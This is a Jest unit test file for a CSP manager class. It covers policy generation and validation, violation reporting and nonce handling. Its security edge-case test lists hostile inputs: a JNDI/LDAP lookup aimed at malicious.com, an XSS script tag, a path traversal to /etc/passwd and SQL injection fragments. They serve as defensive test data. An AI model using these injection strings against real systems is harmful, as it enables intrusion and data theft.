/**
 * Comprehensive unit tests for CSP Manager
 * Tests CSP policy generation, validation, and violation handling
 */

import { CSPManager, CSPManagerConfig } from '../CSPManager';
import { CSPOptions, CSPViolation } from '@shell/interfaces';
import { spyOnConsole } from '../../../test/utils/testHelpers';

// Mock crypto module
jest.mock('crypto', () => ({
  randomBytes: jest.fn(() => Buffer.from('mockedRandomBytes'))
}));

describe('CSPManager', () => {
  let cspManager: CSPManager;
  let mockConfig: CSPManagerConfig;
  let consoleSpy: ReturnType<typeof spyOnConsole>;

  beforeEach(() => {
    mockConfig = {
      useStrictDynamic: true,
      enableViolationReporting: true,
      reportEndpoint: 'https://example.com/csp-report',
      environment: 'production'
    };

    cspManager = new CSPManager(mockConfig);
    consoleSpy = spyOnConsole();

    // Mock fetch for violation reporting
    global.fetch = jest.fn(() =>
      Promise.resolve({
        ok: true,
        statusText: 'OK'
      })
    ) as jest.Mock;
  });

  afterEach(() => {
    consoleSpy.restore();
    jest.clearAllMocks();
    jest.clearAllTimers();
  });

  describe('Constructor and Configuration', () => {
    it('should initialize with default configuration', () => {
      const defaultManager = new CSPManager();
      expect(defaultManager).toBeDefined();
    });

    it('should merge provided config with defaults', () => {
      const customConfig: CSPManagerConfig = {
        useStrictDynamic: false,
        environment: 'development'
      };

      const customManager = new CSPManager(customConfig);
      expect(customManager).toBeDefined();
    });

    it('should set up nonce cleanup interval', () => {
      jest.useFakeTimers();

      new CSPManager(mockConfig);

      expect(setInterval).toHaveBeenCalledWith(
        expect.any(Function),
        3600000 // 1 hour
      );

      jest.useRealTimers();
    });

    it('should apply default options to policy', () => {
      const configWithDefaults: CSPManagerConfig = {
        defaultOptions: {
          defaultSrc: ["'self'", 'https://trusted.com'],
          scriptSrc: ["'self'"]
        }
      };

      const managerWithDefaults = new CSPManager(configWithDefaults);
      const policy = managerWithDefaults.getCurrentPolicy();

      expect(policy.defaultSrc).toContain('https://trusted.com');
    });
  });

  describe('generatePolicy', () => {
    const basicCSPOptions: CSPOptions = {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'nonce-abc123'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'"],
      fontSrc: ["'self'", 'https://fonts.gstatic.com'],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    };

    it('should generate a basic CSP policy string', () => {
      const policy = cspManager.generatePolicy(basicCSPOptions);

      expect(policy).toBeValidCSPPolicy();
      expect(policy).toContain("default-src 'self'");
      expect(policy).toContain("script-src 'self' 'nonce-abc123'");
      expect(policy).toContain("object-src 'none'");
    });

    it('should include strict-dynamic when enabled', () => {
      const policy = cspManager.generatePolicy(basicCSPOptions);

      expect(policy).toContain("'strict-dynamic'");
    });

    it('should not include strict-dynamic when disabled', () => {
      const noStrictDynamicManager = new CSPManager({
        ...mockConfig,
        useStrictDynamic: false
      });

      const policy = noStrictDynamicManager.generatePolicy(basicCSPOptions);

      expect(policy).not.toContain("'strict-dynamic'");
    });

    it('should include upgrade-insecure-requests directive', () => {
      const optionsWithUpgrade: CSPOptions = {
        ...basicCSPOptions,
        upgradeInsecureRequests: true
      };

      const policy = cspManager.generatePolicy(optionsWithUpgrade);

      expect(policy).toContain('upgrade-insecure-requests');
    });

    it('should include report-uri when specified', () => {
      const optionsWithReport: CSPOptions = {
        ...basicCSPOptions,
        reportUri: 'https://example.com/csp-report'
      };

      const policy = cspManager.generatePolicy(optionsWithReport);

      expect(policy).toContain('report-uri https://example.com/csp-report');
    });

    it('should handle empty directive arrays', () => {
      const emptyOptions: CSPOptions = {
        defaultSrc: [],
        scriptSrc: [],
        styleSrc: [],
        imgSrc: [],
        connectSrc: [],
        fontSrc: [],
        objectSrc: [],
        mediaSrc: [],
        frameSrc: []
      };

      const policy = cspManager.generatePolicy(emptyOptions);

      // Policy should be empty or minimal
      expect(policy).toBeDefined();
    });

    it('should merge with current policy options', () => {
      // Set current policy
      cspManager.updatePolicy({
        defaultSrc: ["'self'", 'https://base.com']
      });

      // Generate with additional options
      const policy = cspManager.generatePolicy({
        defaultSrc: ['https://additional.com'],
        scriptSrc: ["'self'"]
      });

      expect(policy).toContain('https://additional.com');
      expect(policy).toContain("script-src 'self'");
    });
  });

  describe('validatePolicy', () => {
    it('should validate a correct CSP policy', () => {
      const validPolicy = "default-src 'self'; script-src 'self' 'unsafe-eval'; object-src 'none'";

      const result = cspManager.validatePolicy(validPolicy);

      expect(result.valid).toBe(true);
      expect(result.errors).toBeUndefined();
      expect(result.parsedPolicy).toBeDefined();
    });

    it('should detect invalid directive names', () => {
      const invalidPolicy = "invalid-directive 'self'; script-src 'self'";

      const result = cspManager.validatePolicy(invalidPolicy);

      expect(result.valid).toBe(false);
      expect(result.errors).toHaveLength(1);
      expect(result.errors![0].message).toContain('Unknown directive');
    });

    it('should validate nonce formats', () => {
      const policyWithInvalidNonce = "script-src 'nonce-invalid!'";

      const result = cspManager.validatePolicy(policyWithInvalidNonce);

      expect(result.valid).toBe(false);
      expect(result.errors![0].message).toContain('Invalid nonce format');
    });

    it('should validate hash formats', () => {
      const policyWithInvalidHash = "script-src 'sha256-invalid!'";

      const result = cspManager.validatePolicy(policyWithInvalidHash);

      expect(result.valid).toBe(false);
      expect(result.errors![0].message).toContain('Invalid hash format');
    });

    it('should validate valid nonce formats', () => {
      const policyWithValidNonce = "script-src 'nonce-YWJjMTIz'";

      const result = cspManager.validatePolicy(policyWithValidNonce);

      expect(result.valid).toBe(true);
    });

    it('should validate valid hash formats', () => {
      const policyWithValidHash = "script-src 'sha256-YWJjMTIzNDU2Nzg5MA=='";

      const result = cspManager.validatePolicy(policyWithValidHash);

      expect(result.valid).toBe(true);
    });

    it('should warn about unsafe values', () => {
      const unsafePolicy = "script-src 'self' 'unsafe-eval' 'unsafe-inline'";

      const result = cspManager.validatePolicy(unsafePolicy);

      expect(result.valid).toBe(true);
      expect(result.warnings).toBeDefined();
      expect(result.warnings!.length).toBeGreaterThan(0);
      expect(result.warnings![0].message).toContain('unsafe-eval');
    });

    it('should handle parsing errors gracefully', () => {
      // Simulate parsing error by providing malformed policy
      const malformedPolicy = "';DROP TABLE policies;--";

      const result = cspManager.validatePolicy(malformedPolicy);

      expect(result.valid).toBe(false);
      expect(result.errors![0].message).toContain('Unknown directive');
    });

    it('should check security best practices', () => {
      const insecurePolicy = "default-src *; script-src 'self'";

      const result = cspManager.validatePolicy(insecurePolicy);

      expect(result.warnings).toBeDefined();
      expect(result.warnings!.some(w => w.message.includes('Wildcard'))).toBe(true);
    });

    it('should warn about missing object-src', () => {
      const policyWithoutObjectSrc = "default-src 'self'; script-src 'self'";

      const result = cspManager.validatePolicy(policyWithoutObjectSrc);

      expect(result.warnings!.some(w => w.message.includes('object-src'))).toBe(true);
    });

    it('should warn about missing base-uri', () => {
      const policyWithoutBaseUri = "default-src 'self'; script-src 'self'";

      const result = cspManager.validatePolicy(policyWithoutBaseUri);

      expect(result.warnings!.some(w => w.message.includes('base-uri'))).toBe(true);
    });
  });

  describe('reportViolation', () => {
    const mockViolation: CSPViolation = {
      'document-uri': 'https://example.com/',
      'violated-directive': 'script-src',
      'blocked-uri': 'https://malicious.com/script.js',
      'line-number': 42,
      'column-number': 10,
      'source-file': 'https://example.com/page.html'
    };

    it('should add timestamp to violation if not present', () => {
      const violationHandler = jest.fn();
      cspManager.onViolation(violationHandler);

      cspManager.reportViolation(mockViolation);

      expect(violationHandler).toHaveBeenCalledWith(
        expect.objectContaining({
          ...mockViolation,
          timestamp: expect.any(Date)
        })
      );
    });

    it('should call registered violation handlers', () => {
      const handler1 = jest.fn();
      const handler2 = jest.fn();

      cspManager.onViolation(handler1);
      cspManager.onViolation(handler2);

      cspManager.reportViolation(mockViolation);

      expect(handler1).toHaveBeenCalledWith(expect.objectContaining(mockViolation));
      expect(handler2).toHaveBeenCalledWith(expect.objectContaining(mockViolation));
    });

    it('should handle handler errors gracefully', () => {
      const faultyHandler = jest.fn(() => {
        throw new Error('Handler error');
      });

      cspManager.onViolation(faultyHandler);

      expect(() => {
        cspManager.reportViolation(mockViolation);
      }).not.toThrow();

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Error in CSP violation handler:',
        expect.any(Error)
      );
    });

    it('should log violations in development environment', () => {
      const devManager = new CSPManager({
        ...mockConfig,
        environment: 'development'
      });

      devManager.reportViolation(mockViolation);

      expect(consoleSpy.warn).toHaveBeenCalledWith(
        'CSP Violation:',
        expect.objectContaining(mockViolation)
      );
    });

    it('should send violation report when configured', async () => {
      cspManager.reportViolation(mockViolation);

      // Allow async operations to complete
      await new Promise(resolve => setTimeout(resolve, 0));

      expect(global.fetch).toHaveBeenCalledWith(
        'https://example.com/csp-report',
        expect.objectContaining({
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({
            'csp-report': expect.objectContaining(mockViolation)
          })
        })
      );
    });

    it('should not send report when reporting is disabled', async () => {
      const noReportManager = new CSPManager({
        ...mockConfig,
        enableViolationReporting: false
      });

      noReportManager.reportViolation(mockViolation);

      await new Promise(resolve => setTimeout(resolve, 0));

      expect(global.fetch).not.toHaveBeenCalled();
    });

    it('should handle fetch errors gracefully', async () => {
      (global.fetch as jest.Mock).mockRejectedValue(new Error('Network error'));

      cspManager.reportViolation(mockViolation);

      await new Promise(resolve => setTimeout(resolve, 0));

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Error sending CSP violation report:',
        expect.any(Error)
      );
    });

    it('should handle non-ok responses', async () => {
      (global.fetch as jest.Mock).mockResolvedValue({
        ok: false,
        statusText: 'Server Error'
      });

      cspManager.reportViolation(mockViolation);

      await new Promise(resolve => setTimeout(resolve, 0));

      expect(consoleSpy.error).toHaveBeenCalledWith(
        'Failed to send CSP violation report:',
        'Server Error'
      );
    });
  });

  describe('updatePolicy', () => {
    it('should update current policy with new directives', () => {
      const updates = {
        scriptSrc: ["'self'", 'https://trusted-scripts.com'],
        styleSrc: ["'self'", "'nonce-abc123'"]
      };

      cspManager.updatePolicy(updates);

      const currentPolicy = cspManager.getCurrentPolicy();
      expect(currentPolicy.scriptSrc).toContain('https://trusted-scripts.com');
      expect(currentPolicy.styleSrc).toContain("'nonce-abc123'");
    });

    it('should merge updates with existing policy', () => {
      // Set initial policy
      cspManager.updatePolicy({
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"]
      });

      // Update with additional directives
      cspManager.updatePolicy({
        imgSrc: ['https://images.com']
      });

      const currentPolicy = cspManager.getCurrentPolicy();
      expect(currentPolicy.defaultSrc).toContain("'self'");
      expect(currentPolicy.scriptSrc).toContain("'self'");
      expect(currentPolicy.imgSrc).toContain('https://images.com');
    });
  });

  describe('getNonce', () => {
    it('should generate a base64 nonce', () => {
      const nonce = cspManager.getNonce();

      expect(nonce).toBeDefined();
      expect(typeof nonce).toBe('string');
      expect(nonce.length).toBeGreaterThan(0);
      // Should be base64 format
      expect(/^[A-Za-z0-9+/]+=*$/.test(nonce)).toBe(true);
    });

    it('should generate unique nonces', () => {
      const nonce1 = cspManager.getNonce();
      const nonce2 = cspManager.getNonce();

      expect(nonce1).not.toBe(nonce2);
    });

    it('should cache nonces for validation', () => {
      const nonce = cspManager.getNonce();

      expect(cspManager.isValidNonce(nonce)).toBe(true);
    });
  });

  describe('isValidNonce', () => {
    it('should validate cached nonces', () => {
      const nonce = cspManager.getNonce();

      expect(cspManager.isValidNonce(nonce)).toBe(true);
    });

    it('should reject invalid nonces', () => {
      expect(cspManager.isValidNonce('invalid-nonce')).toBe(false);
    });

    it('should reject expired nonces', () => {
      jest.useFakeTimers();

      const nonce = cspManager.getNonce();

      // Fast forward beyond nonce expiry (5 minutes)
      jest.advanceTimersByTime(6 * 60 * 1000);

      expect(cspManager.isValidNonce(nonce)).toBe(false);

      jest.useRealTimers();
    });
  });

  describe('onViolation', () => {
    it('should register violation handlers', () => {
      const handler = jest.fn();

      const unsubscribe = cspManager.onViolation(handler);

      expect(typeof unsubscribe).toBe('function');

      cspManager.reportViolation({} as CSPViolation);

      expect(handler).toHaveBeenCalled();
    });

    it('should return unsubscribe function', () => {
      const handler = jest.fn();

      const unsubscribe = cspManager.onViolation(handler);
      unsubscribe();

      cspManager.reportViolation({} as CSPViolation);

      expect(handler).not.toHaveBeenCalled();
    });

    it('should handle multiple handlers and unsubscriptions', () => {
      const handler1 = jest.fn();
      const handler2 = jest.fn();

      const unsubscribe1 = cspManager.onViolation(handler1);
      const unsubscribe2 = cspManager.onViolation(handler2);

      // Unsubscribe first handler
      unsubscribe1();

      cspManager.reportViolation({} as CSPViolation);

      expect(handler1).not.toHaveBeenCalled();
      expect(handler2).toHaveBeenCalled();
    });
  });

  describe('createEnvironmentPolicy', () => {
    it('should create development policy with relaxed settings', () => {
      const devManager = new CSPManager({
        environment: 'development'
      });

      const policy = devManager.createEnvironmentPolicy();

      expect(policy.scriptSrc).toContain("'unsafe-eval'");
      expect(policy.scriptSrc).toContain("'unsafe-inline'");
      expect(policy.styleSrc).toContain("'unsafe-inline'");
      expect(policy.connectSrc).toContain('ws:');
      expect(policy.connectSrc).toContain('wss:');
      expect(policy.connectSrc).toContain('http://localhost:*');
    });

    it('should create staging policy with report-only mode', () => {
      const stagingManager = new CSPManager({
        environment: 'staging',
        reportEndpoint: 'https://example.com/csp-report'
      });

      const policy = stagingManager.createEnvironmentPolicy();

      expect(policy.reportOnly).toBe(true);
      expect(policy.reportUri).toBe('https://example.com/csp-report');
    });

    it('should create production policy with security hardening', () => {
      const prodManager = new CSPManager({
        environment: 'production',
        reportEndpoint: 'https://example.com/csp-report'
      });

      const policy = prodManager.createEnvironmentPolicy();

      expect(policy.upgradeInsecureRequests).toBe(true);
      expect(policy.reportUri).toBe('https://example.com/csp-report');
      expect(policy.reportOnly).toBeUndefined();
    });
  });

  describe('Nonce Cleanup', () => {
    it('should clean up expired nonces', () => {
      jest.useFakeTimers();

      const nonce1 = cspManager.getNonce();

      // Fast forward past expiry
      jest.advanceTimersByTime(6 * 60 * 1000); // 6 minutes

      const nonce2 = cspManager.getNonce();

      // Trigger cleanup
      jest.advanceTimersByTime(3600000); // 1 hour

      // Old nonce should be invalid, new one should be valid
      expect(cspManager.isValidNonce(nonce1)).toBe(false);
      expect(cspManager.isValidNonce(nonce2)).toBe(true);

      jest.useRealTimers();
    });
  });

  describe('Security Edge Cases', () => {
    it('should handle malicious policy inputs', () => {
      const maliciousInputs = [
        "script-src 'unsafe-eval' javascript:",
        "default-src data:;DROP TABLE users;",
        "object-src 'self' <script>alert('xss')</script>",
        "img-src ../../etc/passwd",
        "connect-src ${jndi:ldap://malicious.com/}"
      ];

      maliciousInputs.forEach(input => {
        const result = cspManager.validatePolicy(input);

        // Should either be invalid or cleaned
        expect(result).toBeDefined();
      });
    });

    it('should prevent nonce prediction attacks', () => {
      const nonces = [];

      for (let i = 0; i < 100; i++) {
        nonces.push(cspManager.getNonce());
      }

      // All nonces should be unique
      const uniqueNonces = new Set(nonces);
      expect(uniqueNonces.size).toBe(nonces.length);
    });

    it('should handle concurrent nonce generation safely', () => {
      const promises = [];

      for (let i = 0; i < 10; i++) {
        promises.push(Promise.resolve(cspManager.getNonce()));
      }

      return Promise.all(promises).then(nonces => {
        const uniqueNonces = new Set(nonces);
        expect(uniqueNonces.size).toBe(nonces.length);
      });
    });
  });
});